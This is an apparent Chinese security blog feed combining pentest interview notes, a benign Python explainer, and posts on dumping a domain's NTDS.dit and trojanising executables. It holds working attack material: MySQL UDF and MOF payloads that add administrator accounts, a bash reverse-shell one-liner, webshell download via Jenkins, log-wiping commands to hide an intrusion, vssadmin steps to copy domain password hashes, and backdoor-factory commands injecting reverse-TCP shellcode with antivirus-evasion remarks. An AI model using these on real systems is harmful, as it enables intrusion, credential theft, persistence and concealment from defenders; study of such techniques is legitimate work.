<h1 id="提权"><a href="#提权" class="headerlink" title=" 提权"></a><span id="head63"> 提权</span></h1><h2 id="mysql两种提权方式"><a href="#mysql两种提权方式" class="headerlink" title=" mysql两种提权方式"></a><span id="head64"> mysql两种提权方式</span></h2><p>udf提权,mof提权</p>
<h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title=" Mysql_UDF提权"></a><span id="head65"> Mysql_UDF提权</span></h3><p>要求:<br>1.目标系统是Windows(Win2000,XP,Win2003)；<br>2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数<br>3.有root账号密码<br>导出udf:<br>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数<br>可以再mysql里输入<br><code>select @@basedir</code><br><code>show variables like ‘%plugins%’</code> 寻找mysql安装路径<br>提权:</p>
<p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function cmdshell returns string soname ‘udf.dll’</span><br><span class="line">select cmdshell(‘net user arsch arsch /add’);</span><br><span class="line">select cmdshell(‘net localgroup administrators arsch /add’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>

<p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
<h3 id="Mysql-mof提权"><a href="#Mysql-mof提权" class="headerlink" title="Mysql mof提权"></a><span id="head66">Mysql mof提权</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的第18行的命令，上传前请自己更改。</p>
<p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load file(&apos;c:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mov&apos;</span><br></pre></td></tr></table></figure>

<p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>
<h1 id="特殊漏洞"><a href="#特殊漏洞" class="headerlink" title=" 特殊漏洞"></a><span id="head67"> 特殊漏洞</span></h1><h2 id="Struts2-045"><a href="#Struts2-045" class="headerlink" title=" Struts2-045"></a><span id="head68"> Struts2-045</span></h2><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title=" Redis未授权访问"></a><span id="head69"> Redis未授权访问</span></h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title=" 产生原因"></a><span id="head70"> 产生原因</span></h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
<h3 id="利用条件和方法"><a href="#利用条件和方法" class="headerlink" title=" 利用条件和方法"></a><span id="head71"> 利用条件和方法</span></h3><p>条件:</p>
<ol>
<li>redis服务以root账户运行</li>
<li>redis无密码或弱密码进行认证</li>
<li>redis监听在0.0.0.0公网上</li>
</ol>
<p>方法:</p>
<ul>
<li>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫</li>
<li>上传SSH公钥获得SSH登录权限</li>
<li>通过crontab反弹shell</li>
<li>slave主从模式利用</li>
</ul>
<h3 id="修复"><a href="#修复" class="headerlink" title=" 修复"></a><span id="head72"> 修复</span></h3><ul>
<li>密码验证</li>
<li>降权运行</li>
<li>限制ip/修改端口</li>
</ul>
<h2 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title=" Jenkins未授权访问"></a><span id="head73"> Jenkins未授权访问</span></h2><p>攻击者通过未授权访问进入脚本命令执行界面执行攻击指令</p>
<p><code>println &quot;ifconfig -a&quot;.execute().text</code> 执行一些系统命令,利用wget下载webshell</p>
<h2 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title=" MongoDB未授权访问"></a><span id="head74"> MongoDB未授权访问</span></h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
<h3 id="防护-2"><a href="#防护-2" class="headerlink" title=" 防护"></a><span id="head75"> 防护</span></h3><p>1、为MongoDB添加认证：<br>1)MongoDB启动时添加–auth参数<br>2)给MongoDB添加用户：<br>use admin #使用admin库<br>db.addUser(“root”, “123456”) #添加用户名root密码123456的用户<br>db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功<br>2、禁用HTTP和REST端口<br>MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false<br>3、限制绑定IP<br>启动时加入参数<br>–bind_ip 127.0.0.1<br>或在/etc/mongodb.conf文件中添加以下内容：<br>bind_ip = 127.0.0.1</p>
<h2 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title=" Memcache未授权访问"></a><span id="head76"> Memcache未授权访问</span></h2><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title=" 利用"></a><span id="head77"> 利用</span></h3><p>1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p>
<p>2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在</p>
<h3 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title=" 漏洞加固"></a><span id="head78"> 漏洞加固</span></h3><ul>
<li>1、设置memchached只允许本地访问</li>
<li>2、禁止外网访问Memcached 11211端口</li>
<li>3、编译时加上–enable-sasl，启用SASL认证</li>
</ul>
<h2 id="FFMPEG-本地文件读取漏洞"><a href="#FFMPEG-本地文件读取漏洞" class="headerlink" title="FFMPEG 本地文件读取漏洞"></a><span id="head79">FFMPEG 本地文件读取漏洞</span></h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title=" 原理"></a><span id="head80"> 原理</span></h3><p>通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。</p>
<h1 id="安全知识"><a href="#安全知识" class="headerlink" title=" 安全知识"></a><span id="head81"> 安全知识</span></h1><h2 id="WEB"><a href="#WEB" class="headerlink" title=" WEB"></a><span id="head82"> WEB</span></h2><h3 id="常用WEB开发JAVA框架"><a href="#常用WEB开发JAVA框架" class="headerlink" title=" 常用WEB开发JAVA框架"></a><span id="head83"> 常用WEB开发JAVA框架</span></h3><p>STRUTS,SPRING<br>常见的java框架漏洞<br>其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。<br>045 错误处理引入了ognl表达式<br>048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式<br>反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了</p>
<h3 id="同源策略"><a href="#同源策略" class="headerlink" title=" 同源策略"></a><span id="head84"> 同源策略</span></h3><p>同源策略限制不同源对当前document的属性内容进行读取或设置。<br>不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。</p>
<h3 id="Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"><a href="#Jsonp安全攻防技术，怎么写Jsonp的攻击页面？" class="headerlink" title=" Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"></a><span id="head85"> Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</span></h3><h4 id="涉及到Jsonp的安全攻防内容"><a href="#涉及到Jsonp的安全攻防内容" class="headerlink" title=" 涉及到Jsonp的安全攻防内容"></a><span id="head86"> 涉及到Jsonp的安全攻防内容</span></h4><p>JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。</p>
<h4 id="攻击页面"><a href="#攻击页面" class="headerlink" title=" 攻击页面"></a><span id="head87"> 攻击页面</span></h4><p>JSON劫持，跨域劫持敏感信息，页面类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function wooyun(v)&#123;</span><br><span class="line">alert(v.username);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。<br>JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title=" PHP"></a><span id="head88"> PHP</span></h2><h3 id="php中命令执行涉及到的函数"><a href="#php中命令执行涉及到的函数" class="headerlink" title=" php中命令执行涉及到的函数"></a><span id="head89"> php中命令执行涉及到的函数</span></h3><p>1，代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()<br>2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<h3 id="安全模式下绕过php的disable-fuction"><a href="#安全模式下绕过php的disable-fuction" class="headerlink" title="安全模式下绕过php的disable fuction"></a><span id="head90">安全模式下绕过php的disable fuction</span></h3><p>DL函数，组件漏洞，环境变量。</p>
<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title=" PHP弱类型"></a><span id="head91"> PHP弱类型</span></h3><p><code>==</code> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<p><code>0e</code>开头的字符串等于0</p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title=" 数据库"></a><span id="head92"> 数据库</span></h2><h3 id="各种数据库文件存放的位置"><a href="#各种数据库文件存放的位置" class="headerlink" title=" 各种数据库文件存放的位置"></a><span id="head93"> 各种数据库文件存放的位置</span></h3><p>mysql:<code>/usr/local/mysql/data/</code> <code>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</code><br>oracle:<code>$ORACLE_BASE/oradata/$ORACLE_SID/</code></p>
<h2 id="系统"><a href="#系统" class="headerlink" title=" 系统"></a><span id="head94"> 系统</span></h2><h3 id="如何清理日志"><a href="#如何清理日志" class="headerlink" title=" 如何清理日志"></a><span id="head95"> 如何清理日志</span></h3><p>meterpreter: <code>clearev</code></p>
<h3 id="入侵-Linux-服务器后需要清除哪些日志？"><a href="#入侵-Linux-服务器后需要清除哪些日志？" class="headerlink" title="入侵 Linux 服务器后需要清除哪些日志？"></a><span id="head96">入侵 Linux 服务器后需要清除哪些日志？</span></h3><p>web日志，如apache的access.log,error.log。 直接将日志清除过于明显,一般使用sed进行定向清除</p>
<p>e.g. sed -i -e ‘/192.169.1.1/d’</p>
<p>history命令的清除，也是对~/.bash_history进行定向清除</p>
<p>wtmp日志的清除，/var/log/wtmp</p>
<p>登录日志清除 /var/log/secure</p>
<h3 id="LINUX"><a href="#LINUX" class="headerlink" title=" LINUX"></a><span id="head97"> LINUX</span></h3><h4 id="查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点"><a href="#查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点" class="headerlink" title="查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点"></a><span id="head98">查看当前端口连接的命令有哪些？<code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -antp` `ss -l</span><br></pre></td></tr></table></figure>

<p>ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p>
<h4 id="反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么"><a href="#反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么" class="headerlink" title="反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?"></a><span id="head99">反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h4 id="通过Linux系统的-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"><a href="#通过Linux系统的-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？" class="headerlink" title="通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"></a><span id="head100">通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls /proc</span><br></pre></td></tr></table></figure>

<p>系统信息，硬件信息，内核版本，加载的模块，进程</p>
<h4 id="linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"><a href="#linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。" class="headerlink" title=" linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"></a><span id="head101"> linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</span></h4><p><code>/etc/ssh/sshd___config</code><br>iptables配置</p>
<h4 id="如何一条命令查看文件内容最后一百行"><a href="#如何一条命令查看文件内容最后一百行" class="headerlink" title=" 如何一条命令查看文件内容最后一百行"></a><span id="head102"> 如何一条命令查看文件内容最后一百行</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -n 100 filename</span><br></pre></td></tr></table></figure>

<h3 id="Windows"><a href="#Windows" class="headerlink" title=" Windows"></a><span id="head103"> Windows</span></h3><h4 id="如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"><a href="#如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。" class="headerlink" title=" 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"></a><span id="head104"> 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</span></h4><h2 id="密码学"><a href="#密码学" class="headerlink" title=" 密码学"></a><span id="head105"> 密码学</span></h2><h3 id="AES／DES的具体工作步骤"><a href="#AES／DES的具体工作步骤" class="headerlink" title=" AES／DES的具体工作步骤"></a><span id="head106"> AES／DES的具体工作步骤</span></h3><h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title=" RSA算法"></a><span id="head107"> RSA算法</span></h3><p>加密:<br>$$<br>密文＝明文^EmodN<br>$$<br>RSA加密是对明文的E次方后除以N后求余数的过程</p>
<p>$$<br>公钥＝(E,N)<br>$$<br>解密:</p>
<p>$$<br>明文＝密文^DmodN<br>$$<br>$$<br>私钥＝(D,N)<br>$$<br>三个参数n,e1,e2</p>
<p>n是两个大质数p,q的积</p>
<h3 id="分组密码的加密模式"><a href="#分组密码的加密模式" class="headerlink" title=" 分组密码的加密模式"></a><span id="head108"> 分组密码的加密模式</span></h3><h3 id="如何生成一个安全的随机数？"><a href="#如何生成一个安全的随机数？" class="headerlink" title=" 如何生成一个安全的随机数？"></a><span id="head109"> 如何生成一个安全的随机数？</span></h3><p>引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读/写时的寻道时间、空中电磁波的噪声等。</p>
<h3 id="SSL握手过程"><a href="#SSL握手过程" class="headerlink" title=" SSL握手过程"></a><span id="head110"> SSL握手过程</span></h3><p>建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。<br>这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。</p>
<h3 id="对称加密与非对称加密的不同，分别用在哪些方面"><a href="#对称加密与非对称加密的不同，分别用在哪些方面" class="headerlink" title=" 对称加密与非对称加密的不同，分别用在哪些方面"></a><span id="head111"> 对称加密与非对称加密的不同，分别用在哪些方面</span></h3><h2 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title=" TCP/IP"></a><span id="head112"> TCP/IP</span></h2><h3 id="TCP三次握手的过程以及对应的状态转换"><a href="#TCP三次握手的过程以及对应的状态转换" class="headerlink" title=" TCP三次握手的过程以及对应的状态转换"></a><span id="head113"> TCP三次握手的过程以及对应的状态转换</span></h3><p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;<br>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;<br>（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。  </p>
<h3 id="TCP和UDP协议区别"><a href="#TCP和UDP协议区别" class="headerlink" title=" TCP和UDP协议区别"></a><span id="head114"> TCP和UDP协议区别</span></h3><p>tcp面向连接,udp面向报文<br>tcp对系统资源的要求多<br>udp结构简单<br>tcp保证数据完整性和顺序，udp不保证</p>
<h3 id="https的建立过程"><a href="#https的建立过程" class="headerlink" title=" https的建立过程"></a><span id="head115"> https的建立过程</span></h3><ul>
<li>客户端发送请求到服务器端</li>
<li>服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在</li>
<li>客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端</li>
<li>服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端</li>
<li>客户端使用共享密钥解密数据</li>
<li>SSL加密建立</li>
</ul>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title=" 流量分析"></a><span id="head116"> 流量分析</span></h2><h3 id="wireshark简单的过滤规则"><a href="#wireshark简单的过滤规则" class="headerlink" title=" wireshark简单的过滤规则"></a><span id="head117"> wireshark简单的过滤规则</span></h3><p><strong>过滤ip</strong>:</p>
<p>过滤源ip地址:<code>ip.src==1.1.1.1;</code>,目的ip地址:<code>ip.dst==1.1.1.1;</code></p>
<p><strong>过滤端口</strong>:</p>
<p>过滤80端口:<code>tcp.port==80</code>,源端口:<code>tcp.srcport==80</code>,目的端口:<code>tcp.dstport==80</code></p>
<p><strong>协议过滤</strong>:</p>
<p>直接输入协议名即可,如http协议<code>http</code></p>
<p><strong>http模式过滤</strong>:</p>
<p>过滤get/post包<code>http.request.mothod==&quot;GET/POST&quot;</code></p>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title=" 防火墙"></a><span id="head118"> 防火墙</span></h2><h3 id="简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"><a href="#简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。" class="headerlink" title=" 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"></a><span id="head119"> 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</span></h3><blockquote>
<p>转载请注明出处谢谢！</p>
</blockquote>
]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>如何理解python程序入口</title>
    <url>/2019/09/26/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3python%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3/</url>
    <content><![CDATA[<p>我经常在大佬的程序中看到这样的东西（if _ _ name _ _ == ‘_ _ main _ _’）<br>以前在学校的时候也只知道是个程序的入口，然后就只看下面的部分而已。只知道程序是从（if _ _ name _ _ == ‘ _ _ main _ _’）下面开始走的。<br>今天在看python 3.7的官方文档时，刚好看到这东西了，就顺便写一下自己的理解</p><a id="more"></a>
<p>在大佬们的程序中，我们一眼看去，程序是分为这么几个块的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ******       &lt;-------1、导入的某个模块</span><br><span class="line"></span><br><span class="line">def xxxx():         &lt;-------2、定义的某个函数</span><br><span class="line">    ******</span><br><span class="line">    ******</span><br><span class="line">    ******</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:          &lt;-------3、入口</span><br><span class="line"></span><br><span class="line">    ******       &lt;-------4、入口执行的代码</span><br><span class="line">    ******</span><br></pre></td></tr></table></figure>

<p>（至少我以前在学校里的时候看一个程序，都是这么看的。。。。。）</p>
<p>在这4个块中，以前在学校，我只看第4部分，也就是程序执行的代码。<br>工作之后，我看一眼第4部分，然后主要专研第2部分，这个定义的函数主要都做了什么。</p>
<p>第1部分很好理解，就是导入了某个程序需要用模块。</p>
<p>而这第3部分呢，事实上，它为程序定义了一个入口，按上面的代码举个栗子</p>
<h3 id="一：当我们直接运行这个程序的时候"><a href="#一：当我们直接运行这个程序的时候" class="headerlink" title="一：当我们直接运行这个程序的时候"></a>一：当我们直接运行这个程序的时候</h3><p>当我们直接运行这个程序的时候，程序是这么走的。</p>
<ol>
<li>先从入口（3），开始往下走。</li>
<li>走到代码执行部分（4）</li>
<li>当执行的代码需要用到自己定义的函数的时候，代码就直接跳到定义的函数部分（2）</li>
</ol>
<p>上面应该能理解吧？这就是python逐步执行程序的步骤。（不谈导入模块部分，类似于上述第3步）</p>
<hr>
<p>但是呢，有时候我们写了另外一个程序B(假设上面一开始的是程序A),而程序B的某一部分代码需要用到程序A中已经定义好的函数，那么这时候怎么搞？</p>
<p>把程序A中的函数定义的代码复制粘贴过去？</p>
<p>也不是不可以，但是如果你要开发一个系统呢，上万行的代码，都粘贴到一个文件中？</p>
<p>这时候，我们可以使用导入模块的方式来导入需要的函数！</p>
<h3 id="二：当我们把这个程序当做模块导入另一个程序的时候"><a href="#二：当我们把这个程序当做模块导入另一个程序的时候" class="headerlink" title="二：当我们把这个程序当做模块导入另一个程序的时候"></a>二：当我们把这个程序当做模块导入另一个程序的时候</h3><p>这时候我们就需要if <strong>name</strong> == ‘<strong>main</strong>‘:来帮助我们了。<br>当这个程序A被当做模块导入另一个程序的时候，我们只需要其中1、2部分，而不需要第4部分。</p>
<p>所以在程序中，import程序A后，当程序B的代码需要用到程序A中定义好的函数的时候，它会自己去取函数部分，而不会使整个程序A执行。</p>
<p>大致步骤如下：</p>
<p>1、从程序B入口开始往下，走到代码执行部分</p>
<p>2、当执行的代码需要用到程序A中的函数时，去取出程序A函数代码（不取出第3、4部分代码），再执行</p>
<p>像if _ _ name _ _ == ‘ _ _main _ _’:这样的方式写程序，当以后我们另一个程序需要用到这个程序的时候，就直接导入这个程序就好了，省去了重写函数和复制粘贴的时候。</p>
<p>我觉得我越说越乱，上结论：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当xx.py文件被直接运行时，if __name__ == &apos;__main__&apos;之下的代码块将被运行；</span><br><span class="line">当xx.py文件以模块形式被导入时，if __name__ == &apos;__main__&apos;之下的代码块不被运行。</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>VSS获取NTDS.dit的方法</title>
    <url>/2019/09/19/VSS%E8%8E%B7%E5%8F%96NTDS.dit%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>本文是看Uknow大佬的文章，选其中一部分copy出来的。<br>原文链接：<a href="https://uknowsec.cn/posts/notes/域渗透-获取NTDS.dit.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/域渗透-获取NTDS.dit.html</a></p>
</blockquote><a id="more"></a>
<h2 id="Ntds-dit介绍"><a href="#Ntds-dit介绍" class="headerlink" title="Ntds.dit介绍"></a>Ntds.dit介绍</h2><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
<h2 id="vssadmin获取Ntds"><a href="#vssadmin获取Ntds" class="headerlink" title="vssadmin获取Ntds"></a>vssadmin获取Ntds</h2><p>vssadmin域环境默认安装</p>
<p>支持系统：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server 2008</span><br><span class="line">Server 2012</span><br></pre></td></tr></table></figure>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="1、查询当前系统的快照"><a href="#1、查询当前系统的快照" class="headerlink" title="1、查询当前系统的快照"></a>1、查询当前系统的快照</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
<h3 id="2、创建快照（在C盘）"><a href="#2、创建快照（在C盘）" class="headerlink" title="2、创建快照（在C盘）"></a>2、创建快照（在C盘）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/Lcd8x7ghFBVDqj1.png" alt="1567068293370.png"></p>
<p>获得Shadow Copy Volume Name为\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</p>
<h3 id="3、复制ntds-dit"><a href="#3、复制ntds-dit" class="headerlink" title="3、复制ntds.dit"></a>3、复制ntds.dit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
<h3 id="4、删除快照"><a href="#4、删除快照" class="headerlink" title="4、删除快照"></a>4、删除快照</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/IUptaXyk4RPuoE5.png" alt="1567068417353.png"></p>
<p>完了就直接把c:\ntds.dit复制出来解密就好</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode注入工具—backdoor-factory</title>
    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>

<p>生成好之后可以对比一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>

<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>vssadmin获取NTDS实操</title>
    <url>/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/</url>
    <content><![CDATA[<p>把昨天发的vssadmin获取ntds数据库的文章实际操作了一下<br>这里使用的是God.org单域环境(更新1)，我的目的只是实操vssadmin所以不搞的太复杂<br><img src="https://i.loli.net/2019/11/11/gKbpe8clSqTjYZ9.png" alt="Image-1.png"></p><a id="more"></a>
<p>下载、解压、打开虚拟机（开机密码在描述里）</p>
<p>打开终端执行命令看一下list</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/orH5BgVIn41Lhx9.png" alt="Image-2.png"></p>
<p>然后创建一个快照</p>
